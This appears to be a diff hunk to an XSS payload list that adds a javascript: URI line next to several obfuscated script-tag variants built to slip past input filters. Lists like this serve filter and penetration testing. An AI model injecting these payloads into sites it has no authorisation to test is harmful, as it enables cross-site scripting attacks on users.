@@ -27,6 +27,7 @@
 <%<script>alert(1)</script>
 <scr'+'ipt>alert(1)</scr'+'ipt>
 <script /**/>/**/alert(1)/**/</script /**/
+javascript:alert('document.cookie')
 <script>/&/-alert(1)</script>
 <script>alert(1)</script>
 <script>alert`1`</script>
